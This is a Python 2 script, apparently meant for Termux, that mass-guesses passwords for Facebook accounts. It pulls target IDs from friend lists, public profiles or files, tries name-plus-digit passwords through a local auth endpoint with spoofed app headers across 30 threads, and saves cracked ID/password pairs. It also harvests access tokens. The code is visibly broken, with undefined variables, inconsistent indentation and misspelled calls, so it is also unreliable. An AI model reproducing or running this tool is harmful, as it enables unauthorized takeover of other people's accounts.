#!/usr/bin/python2
#coding=utf-8
#Codded By Jam Shahrukh
#Editing My Script Will Not Make You A Coder
#Facebook : JAM Shahrukh
#Whatsapp : +923053176060
#Pakistan Cyber Expert
#Alone Coder 
try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("pip2 install mechazine")
    os.system("pip2 install lolcat")
    os.system("python2 jam.py")
os.system("clear")

try:
    my = requests.get("https://www.facebook.com/Jam.shahrukh.official")
except requests.exceptions.ConnectionError:
    os.system('git pull')
if not os.path.isfile("/data/data/com.termux/files/home/...../public/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("xdg-open https://www.facebook.com/Jam.shahrukh.official")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/public/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && node index.js &")
    os.system("clear")
    os.system("termux setup storage")
    time.sleep(5)
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }

os.system('clear')
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)
##### INTRO #####
def logo():
    os.system('echo -e "\n\n    .S   .S_SSSs     .S_SsS_S.   \n   .SS  .SS~SSSSS   .SS~S*S~SS.  \n   S%S  S%S   SSSS  S%S  Y S%S  \n   S%S  S%S    S%S  S%S  •  S%S  \n   S&S  S%S•SSSS%S  S%S  •  S%S  \n   S&S  S&S  SSS%S  S&S  °  S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   d*S  S*S    S&S  S*S     S*S  \n  .S*S  S*S    S*S  S*S     S*S  \nsdSSS   S*S    S*S  S*S     S*S  \nYSSY    SSS    S*S  SSS     S*S  \n               SP           SP   \n               Y            Y    \n-----------------------------------------------\n➣ Author : Jam Shahrukh x Xtylo Ali Raza\n➣ Github : https://github.com/Blacklisted\n➣ Fb Page : Jam Shahrukh Official\n-----------------------------------------------" | lolcat')
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
logo()

CorrectUsername = "mishi"
CorrectPassword = "mishi"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
def methodlogin():
	os.system('clear')
	logo()
	print "[1] Login With ID/Password."
	print "[2] Login Using Token."
	print "[3] Exit."
	print ('      ')
	hos = raw_input("\nChoose Option >>  ")
	if hos =="":
		print"[!]  Wrong Input"
		exit()
	elif hos =="1":
		login()
	elif hos =="2":
		os.system('clear')
		logo()
		hosp = raw_input("[+] Give Token : ")
		tik()
		hopa = open('access_token.txt', 'w')
		hopa.write(hosp)
		hopa.close()
		print "\n[✓] Logged In Successfully."
		time.sleep(1)
		os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
		menu()
	elif hos =="0":
		exit()
	else:
		print"[!] Wrong Input"
		exit()
def login():
	os.system("clear")
	try:
		tb=open('access_token.txt', 'w')
		os.system("python2 .hop2.py")
	except (KeyError,IOError):
		os.system("clear")
		logo()
		hamza('[+] Login Your Facebook Account')
		hamza('[!] NIGHT 007 OWNER MISHAL KHAN')
		print'-------------------------------------'
		iid=raw_input('[+] Number/Email: ')
		id=iid.replace(" ","")
		pwd=raw_input('[+] Password : ')
		tik()
		data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
		z=json.load(data)
		if 'access_token' in z:
		    st = open("login.txt", "w")
		    st.write(z["access_token"])
		    st.close()
		    print "\n[✓] Logged In Successfully."
		    time.sleep(1)
		    os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
		    os.system("clear")
		    menu()
		else:
		    if "www.facebook.com" in z["error_msg"]:
		        print ('[!] User Must Verify Account Before Login.')
		        time.sleep(3)
		        login()
		    else:
		        print ('[!]Number/User Id/ Password Is Wrong !')
		        time.sleep(1)
		        methodlogin()


def menu():
	os.system('clear')
	try:
		token = open('access_token.txt', 'r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;31mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		methodlogin()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;31mYour Account is on Checkpoint"
		time.sleep(1)
		methodlogin()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;97mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:jam
	logo()
	print "  \033[1;97m        ⚡ \033[1;97mLogged in User Info\033[1;97m ⚡"
	print "	   \033[1;97m Name\033[1;97m:\033[1;97m"+nama+"\033[1;97m               "
	print "	   \033[1;97m ID\033[1;97m:\033[1;97m"+id+"\x1b[1;97m              "
	
	print "\033[1;97m---------------------------------------------------------"
		
	print "\033[1;97m✧\033[1;97m.\033[1;97m1.\x1b[1;97m Start Cloning..."
      
        
        print "\033[1;97m✧\033[1;97m.\033[1;97m2.\033[1;97m Follow Me On YouTube For Help"
        print "\033[1;97m✧\033[1;97m.\033[1;97m0.\033[1;97m Logout            "
        hop()

def hop():
	hack = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
	if hack =="":
		print "\x1b[1;97mFill in correctly"
		hop()
	elif hack =="1":
		super()
	elif hack =="2":
	        os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
	        menu()
        
	elif hack =="0":
		hamu('Token Removed')
		os.system('rm -rf login.txt')
		exit()
	else:
		print "\x1b[1;97mFill in correctly"
		hop()
def super():
	global toket
	os.system('clear')
	try:
		token=open('access_token.txt', 'r').read()
	except IOError:
		print"\x1b[1;97mToken invalid"
		time.sleep(1)
		methodlogin()
	os.system('clear')
	logo()
	print "\033[1;97m✧ \033[1;97m1.\x1b[1;97mCrack From Friend List."
	print "\033[1;97m✧ \033[1;97m2.\x1b[1;97mCrack From Public ID."
	print "\033[1;97m✧ \033[1;97m3.\x1b[1;97mCrack From File."
	print "\033[1;97m✧ \033[1;97m0.\033[1;97mBack."
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
        if peak =="1":
		os.system('clear')
		logo()
		print "\033[1;97m Please Wait"
		jalan('\033[1;97m[✔] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+ token)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
                os.system('clear')
                logo()
                print '\033[1;31;1m~~~~ public cracking ~~~~'
                print ''
                print '\033[1;93m For example: 123 , 1234 , 1234, 786 , 12 , 1122'
                print ''
                p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
                pass4 = raw_input(' \033[1;92m[4]Password: ')
		pass5 = raw_input(' \033[1;92m[5]Password: ')
                pass6 = raw_input(' \033[1;92m[6]Password: ')
                pass7 = raw_input(' \033[1;92m[7]Password: ')
                pass8 = raw_input(' \033[1;92m[8]Password: ')
                idt = raw_input(' \033[1;93m[★]Enter id: ')
		
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+ token)
		op = json.loads(jok.text)
		print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+op["name"]
	except KeyError:
		print"\x1b[1;97mID Not Found!"
		raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
		super()
		print"\033[1;97m[✔] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+ token)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
			
	if peak =="3":
                os.system('clear')
                logo()
                print '\033[1;31;1m~~~~ File cracking ~~~~'
                print ''
                print '\033[1;93m For example: 123 , 1234 , 1234, 786 , 12 , 1122'
                print ''
                p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
                pass4 = raw_input(' \033[1;92m[4]Password: ')
		pass5 = raw_input(' \033[1;92m[5]Password: ')
                pass6 = raw_input(' \033[1;92m[6]Password: ')
                pass7 = raw_input(' \033[1;92m[7]Password: ')
                pass8 = raw_input(' \033[1;92m[8]Password: ')
	try:
	        idlist= raw_input('[+] File Name: ')
	        for line in open(idlist ,'r').readlines():
	            id.append(line.strip())
	except IOError:
	         print"[!] File Not Found."
	         raw_input('Press Enter To Back. ')
                 super()
	if peak =="0":
		menu()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	
	print "\033[1;97m[✔] Total Friends \033[1;97m: \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[✔] Cloning Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
        print"""
print ('[!] To Stop Process Press CTRL Then Z')
---------------------------------------------------------"""		
			
	def main(arg):
		global cekpoint,oks
		user = arg
                (uid, name) = user.split('|')
                try:
                   pass1 = name.lower() + p1
                   data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
                   q = json.loads(data)
                   if 'loc' in q:
                       print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                       ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                       ok.write(uid + ' | ' + pass1 + '\n')
                       ok.close()
                       oks.append(uid + pass1)
                   elif 'www.facebook.com' in q['error']:
                       print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass1
                       cp = open('HOP_CP.txt', 'a')
                       cp.write(uid + ' | ' + pass1 + '\n')
                       cp.close()
                       cps.append(uid + pass1)
                   else:
                       pass2 = name.lower() + p2
                       data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                       q = json.loads(data)
                       if 'loc' in q:
                           print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                           ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                           ok.write(uid + ' | ' + pass2 + '\n')
                           ok.close()
                           oks.append(uid + pass2)
                       elif 'www.facebook.com' in q['error']:
                           print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass2
                           cp = open('HOP_CP.txt', 'a')
                           cp.write(uid + ' | ' + pass2 + '\n')
                           cp.close()
                           cps.append(uid + pass2)
                       else:
                           pass3 = name.lower() + p3
                           data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                           q = json.loads(data)
                           if 'loc' in q:
                               print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                               ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                               ok.write(uid + ' | ' + pass3 + '\n')
                               ok.close()
                               oks.append(uid + pass3)
                           elif 'www.facebook.com' in q['error']:
                               print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass3
                               cp = open('HOP_CP.txt', 'a')
                               cp.write(uid + ' | ' + pass3 + '\n')
                               cp.close()
                               cps.append(uid + pass3)
                           else:
                               data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                               q = json.loads(data)
                               if 'loc' in q:
                                   print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                                   ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                   ok.write(uid + ' | ' + pass4 + '\n')
                                   ok.close()
                                   oks.append(uid + pass4)
                               elif 'www.facebook.com' in q['error']:
                                   print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass4
                                   cp = open('HOP_CP.txt', 'a')
                                   cp.write(uid + ' | ' + pass4 + '\n')
                                   cp.close()
                                   cps.apppend(uid + pass4)
			       else:
				   data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
                                   q = json.loads(data)
                                   if 'loc' in q:
                                       print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                       ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                       ok.write(uid + ' | ' + pass5 + '\n')
                                       ok.close()
                                       oks.append(uid + pass5)
                                   elif 'www.facebook.com' in q['error']:
                                       print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass5
                                       cp = open('HOP_CP.txt', 'a')
                                       cp.write(uid + ' | ' + pass5 + '\n')
                                       cp.close()
                                       cps.append(uid + pass5)
                                   else:
                                       data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
                                       q = json.loads(data)
                                       if 'loc' in q:
                                           print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                           ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                           ok.write(uid + ' | ' + pass6 + '\n')
                                           ok.close()
                                           oks.append(uid + pass6)
                                       elif 'www.facebook.com' in q['error']:
                                           print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass6
                                           cp = open('HOP_CP.txt', 'a')
                                           cp.write(uid + ' | ' + pass6 + '\n')
                                           cp.close()
                                           cps.append(uid + pass6)
                                       else:
                                           data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
                                           q = json.loads(data)
                                           if 'loc' in q:
                                               print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                               ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                               ok.write(uid + ' | ' + pass7 + '\n')
                                               ok.close()
                                               oks.append(uid + pass7)
                                           elif 'www.facebook.com' in q['error']:
                                               print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass7
                                               cp = open('HOP_CP.txt', 'a')
                                               cp.write(uid + ' | ' + pass7 + '\n')
                                               cp.close()
                                               cps.append(uid + pass7)
                                           else:
                                               data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers = header).text
                                               q = json.loads(data)
                                               if 'loc' in q:
                                                   print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                                   ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                                   ok.write(uid + ' | ' + pass8 + '\n')
                                                   ok.close()
                                                   oks.append(uid + pass8)
                                               elif 'www.facebook.com' in q['error']:
                                                   print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass8
                                                   cp = open('HOP_CP.txt', 'a')
                                                   cp.write(uid + ' | ' + pass8 + '\n')
                                                   cp.close()
                                                   cps.apppend(uid + pass8)
		except:
			pass
		
    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print ' \033[1;92mCrack Done'
    print '\033[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    raw_input('\033[1;93m Press enter to back')
    menu()
	

if __name__ == '__main__':
    methodlogin()
